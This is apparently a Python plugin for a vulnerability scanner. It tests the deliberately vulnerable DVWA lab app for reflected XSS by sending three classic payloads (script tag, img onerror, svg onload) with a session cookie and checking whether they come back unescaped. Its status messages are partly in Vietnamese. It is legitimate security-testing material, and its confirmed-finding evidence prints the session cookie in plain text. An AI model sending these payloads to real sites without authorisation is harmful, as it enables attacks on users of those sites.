import urllib.request
import urllib.parse
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

class DVWAXSSPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-XSS",
            "name": "DVWA XSS Reflected",
            "cvss_score": 6.1,
            "service": "http",
            "vuln_type": "xss_reflected"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        payloads = [
            ("<script>alert('XSS')</script>",  "<script>alert",  "basic script tag"),
            ("<img src=x onerror=alert(1)>",   "onerror=alert",  "img onerror event"),
            ("'\"><svg onload=alert(1)>",       "onload=alert",   "SVG onload bypass"),
        ]

        url_base = f"http://{target_ip}:{target_port}/vulnerabilities/xss_r/"

        for payload, marker, technique in payloads:
            try:
                url = f"{url_base}?name={urllib.parse.quote(payload)}"
                print(f"      [XSS] [{technique}] Payload: {payload}")
                req = urllib.request.Request(url)
                req.add_header("Cookie", cookie)
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read().decode('utf-8')
                reflected = marker in body
                print(f"      [XSS] Response: reflected={reflected}")

                if reflected:
                    print(f"      [XSS] ✓ CONFIRMED với technique: {technique}")
                    return {
                        "status": "CONFIRMED",
                        "evidence": (
                            f"XSS Reflected thành công.\n"
                            f"      - Technique  : {technique}\n"
                            f"      - URL        : {url}\n"
                            f"      - Payload    : {payload}\n"
                            f"      - Cookie     : {cookie}\n"
                            f"      - Reflect    : payload xuất hiện unescaped trong HTML"
                        )
                    }
                else:
                    print(f"      [XSS] ✗ Payload bị encode/filter — thử tiếp")
            except Exception as e:
                print(f"      [XSS] ✗ Error: {e}")

        return {"status": "FALSE_POSITIVE", "evidence": "Tất cả XSS payload bị filter"}
